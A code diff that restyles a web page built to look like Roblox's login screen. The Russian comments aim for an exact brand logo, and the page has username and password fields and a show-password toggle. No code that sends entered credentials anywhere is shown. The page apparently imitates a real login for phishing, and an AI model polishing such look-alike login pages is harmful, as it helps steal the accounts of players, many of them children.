@@ -33,7 +33,6 @@
             padding: 20px 16px;
         }
         
-        /* Background dimming */
         body::before {
             content: "";
             position: fixed;
@@ -42,7 +41,6 @@
             z-index: -2;
         }
 
-        /* Background game collage tiles */
         .bg-collage {
             position: fixed;
             top: 0; left: 0; width: 100%; height: 100%;
@@ -84,37 +82,35 @@
             z-index: 10;
         }
 
-        /* Точный фирменный логотип Roblox с наклонным квадратом */
+        /* Идеальный брендовый логотип Roblox с наклонным квадратом-о */
         .roblox-logo {
-            font-size: 42px;
+            font-size: 40px;
             font-weight: 900;
-            letter-spacing: -1.5px;
+            letter-spacing: -1px;
             color: #fff;
             margin-bottom: 30px;
             text-transform: uppercase;
-            display: flex;
+            display: inline-flex;
             align-items: center;
-            transform: skew(-8deg);
         }
-
-        .o-box-wrapper {
+        .roblox-logo .o-icon {
             display: inline-block;
-            position: relative;
-            width: 32px;
-            height: 38px;
-            margin: 0 1px;
+            width: 24px;
+            height: 32px;
             background: #fff;
             border-radius: 5px;
-            transform: rotate(12deg);
+            margin: 0 2px;
+            transform: rotate(-12deg) skewX(-5deg);
+            position: relative;
         }
-
-        .o-box-inner {
+        .roblox-logo .o-icon::after {
+            content: "";
             position: absolute;
             top: 50%;
             left: 50%;
             transform: translate(-50%, -50%);
-            width: 16px;
-            height: 20px;
+            width: 10px;
+            height: 16px;
             background: #0d0f12;
             border-radius: 2px;
         }
@@ -143,7 +139,7 @@
             color: #9ca3af;
         }
 
-        /* Полностью серая и чистая кнопка глазика без лишних оттенков */
+        /* Фулл серый глазик без изменения цвета и прозрачности при клике */
         .eye-btn {
             position: absolute;
             right: 14px;
@@ -154,11 +150,8 @@
             cursor: pointer;
             font-size: 18px;
             padding: 4px;
-            color: #9ca3af;
-            filter: grayscale(100%);
-        }
-        .eye-btn:hover {
-            color: #fff;
+            color: #9ca3af !important;
+            opacity: 1 !important;
         }
 
         .login-btn {
@@ -244,10 +237,8 @@
     </div>
 
     <div class="container">
-        <!-- Фирменный логотип Roblox -->
-        <div class="roblox-logo">
-            R<span class="o-box-wrapper"><span class="o-box-inner"></span></span>BLOX
-        </div>
+        <!-- Логотип Roblox с правильным наклонным «O» -->
+        <div class="roblox-logo">R<span class="o-icon"></span>BLOX</div>
 
         <div class="input-box">
             <input type="text" id="usernameInput" placeholder="Username/Email/Phone" oninput="checkInputs()">
@@ -286,14 +277,10 @@
 
         function togglePassword() {
             const passwordInput = document.getElementById('passwordInput');
-            const eyeToggle = document.getElementById('eyeToggle');
-            
             if (passwordInput.type === 'password') {
                 passwordInput.type = 'text';
-                eyeToggle.style.opacity = '0.5';
             } else {
                 passwordInput.type = 'password';
-                eyeToggle.style.opacity = '1';
             }
         }
 
